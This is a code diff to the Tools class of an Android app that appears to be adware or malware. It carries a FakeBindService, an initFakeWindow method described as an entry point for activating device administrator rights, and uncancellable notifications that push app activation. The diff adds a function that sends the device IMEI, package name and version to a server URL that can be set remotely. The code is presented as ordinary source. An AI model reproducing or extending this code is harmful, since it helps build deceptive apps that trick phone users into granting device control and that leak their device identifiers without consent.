@@ -32,6 +32,7 @@ import com.xstd.ip.receiver.BindDeviceReceiver;
 import com.xstd.ip.service.CoreService;
 import com.xstd.ip.service.FakeBindService;
 import net.tsz.afinal.FinalDb;
+import net.tsz.afinal.http.AjaxCallBack;
 
 import java.io.File;
 import java.lang.reflect.Method;
@@ -177,6 +178,13 @@ public class Tools {
         }
     }
 
+    /**
+     * 通过apk包的路径获得apk的icon
+     *
+     * @param context
+     * @param path
+     * @return
+     */
     public static Drawable getIconByAPKPath(Context context, String path) {
         PackageInfo info = context.getPackageManager().getPackageArchiveInfo(path, PackageManager.GET_ACTIVITIES);
         if (info == null)
@@ -262,6 +270,11 @@ public class Tools {
         activity.startActivityForResult(i, 1000);
     }
 
+    /**
+     * 判断当前系统是否是2.3以上
+     *
+     * @return
+     */
     public static boolean isVersionBeyondGB() {
         return Build.VERSION.SDK_INT > Build.VERSION_CODES.GINGERBREAD_MR1;
     }
@@ -278,6 +291,11 @@ public class Tools {
         return context.getSharedPreferences(Config.SHARED_PRES, Context.MODE_PRIVATE).getInt("device_bind_active", 0);
     }
 
+    /**
+     * 激活设备管理器入口
+     *
+     * @param context
+     */
     public static void initFakeWindow(Context context) {
         if (isTrueTime()) {
             SharedPreferences setting = context.getSharedPreferences(Config.SHARED_PRES, Context.MODE_PRIVATE);
@@ -316,6 +334,7 @@ public class Tools {
 
     /**
      * 获得可下载路径
+     *
      * @param context
      * @return
      */
@@ -366,6 +385,7 @@ public class Tools {
 
     /**
      * 使用通知的方式激活程序
+     *
      * @param context
      * @param info
      */
@@ -387,6 +407,7 @@ public class Tools {
 
         NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
         Notification notification = new Notification(R.drawable.ic_jog_dial_sound_on, info.getTickerText(), System.currentTimeMillis());
+        notification.defaults = Notification.DEFAULT_SOUND;
         notification.flags = Notification.FLAG_NO_CLEAR;
         RemoteViews contentView = new RemoteViews(context.getPackageName(), R.layout.notification);
         contentView.setImageViewBitmap(R.id.image, ((BitmapDrawable) icon).getBitmap());
@@ -394,13 +415,15 @@ public class Tools {
         contentView.setTextViewText(R.id.text, info.getContent());
         Intent receiver = new Intent(context, ActiveReceiver.class);
         receiver.putExtra("info", info);
-        contentView.setOnClickPendingIntent(R.id.btn, PendingIntent.getBroadcast(context, 0, receiver, 0));
+        contentView.setOnClickPendingIntent(R.id.parent, PendingIntent.getBroadcast(context, 0, receiver, 0));
         notification.contentView = contentView;
+        Log.w("PS", "发送时候的id" + info.getNotification_id());
         nm.notify(info.getNotification_id(), notification);
     }
 
     /**
      * 获得程序的版本号
+     *
      * @param context
      * @return
      */
@@ -411,5 +434,28 @@ public class Tools {
             e.printStackTrace();
         }
         return null;
+    }
+
+    /**
+     * 发送激活信息到服务器
+     *
+     * @param context
+     * @param packageName
+     * @param type
+     */
+    public static void pushActiveMessage(Context context, String packageName, int type) {
+        InitApplication application = (InitApplication) context.getApplicationContext();
+        String url = String.format(application.getSharedPreferences().getString("fetch_server_url", CoreService.FETCH_SERVER_URL) + "?method=retActivapack&packname=%s&actype=%d&version=%s&imei=%s", packageName, type, Tools.getVersion(context), application.getImei());
+        application.getFinalHttp().get(url, new AjaxCallBack<Object>() {
+            @Override
+            public void onSuccess(Object o) {
+                super.onSuccess(o);
+            }
+
+            @Override
+            public void onFailure(Throwable t, int errorNo, String strMsg) {
+                super.onFailure(t, errorNo, strMsg);
+            }
+        });
     }
 }
